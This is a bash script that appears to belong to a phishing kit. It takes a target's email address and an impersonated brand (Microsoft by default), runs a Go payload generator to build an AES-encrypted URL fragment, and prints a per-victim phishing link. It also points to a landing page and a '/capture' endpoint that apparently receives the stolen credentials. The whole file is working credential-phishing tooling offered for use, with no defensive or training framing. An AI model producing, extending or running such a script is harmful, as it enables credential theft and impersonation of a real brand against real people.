#!/bin/bash
# generate-url.sh — Generate a phishing URL with encrypted fragment
# Usage: ./generate-url.sh --email victim@corp.com --brand microsoft [--redirect URL] [--campaign ID]
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
GEN_DIR="$SCRIPT_DIR/../payload-generator"

# Defaults
BRAND="microsoft"
REDIRECT="https://login.microsoftonline.com"
CAMPAIGN=""
LANDING_HOST="${PHISH_HOST:-localhost:9090}"
KEY="${AES_KEY:-}"

# Parse args
while [[ $# -gt 0 ]]; do
    case "$1" in
        --email) EMAIL="$2"; shift 2 ;;
        --brand) BRAND="$2"; shift 2 ;;
        --redirect) REDIRECT="$2"; shift 2 ;;
        --campaign) CAMPAIGN="$2"; shift 2 ;;
        --host) LANDING_HOST="$2"; shift 2 ;;
        --key) KEY="$2"; shift 2 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

if [ -z "$EMAIL" ]; then
    echo "ERROR: --email is required"
    exit 1
fi

# Generate key if not provided
if [ -z "$KEY" ]; then
    echo "No AES_KEY set. Generating new key..."
    KEY=$(cd "$GEN_DIR" && go run . keygen.go 2>/dev/null | head -1)
    echo "Key: $KEY"
    echo "SAVE THIS KEY. It must match the key in landing-page/index.html (AES_KEY_B64)"
fi

# Build key args
if [ -n "$CAMPAIGN" ]; then
    CAMPAIGN_ARG="--campaign $CAMPAIGN"
fi

# Generate the encrypted fragment
echo "=== Generating payload for: $EMAIL ==="
FRAGMENT=$(cd "$GEN_DIR" && go run . main.go \
    --key "$KEY" \
    --email "$EMAIL" \
    --brand "$BRAND" \
    --redirect "$REDIRECT" \
    $CAMPAIGN_ARG 2>/dev/null | grep -v "===\|Email:\|Brand:\|Template:\|Redirect:\|Campaign:\|Payload:" | grep -v '^$' | head -1)

if [ -z "$FRAGMENT" ]; then
    echo "ERROR: Failed to generate fragment"
    exit 1
fi

echo ""
echo "=============================================="
echo "  PHISHING URL"
echo "=============================================="
echo ""
echo "https://${LANDING_HOST}/#${FRAGMENT}"
echo ""
echo "=============================================="
echo "  NOTES"
echo "=============================================="
echo "  AES Key: $KEY"
echo "  Brand:   $BRAND"
echo "  Email:   $EMAIL"
echo "  Redirect: $REDIRECT"
echo ""
echo "  Landing page serves at: http://${LANDING_HOST}/"
echo "  Capture backend POSTs to: http://${LANDING_HOST}/capture"
echo ""
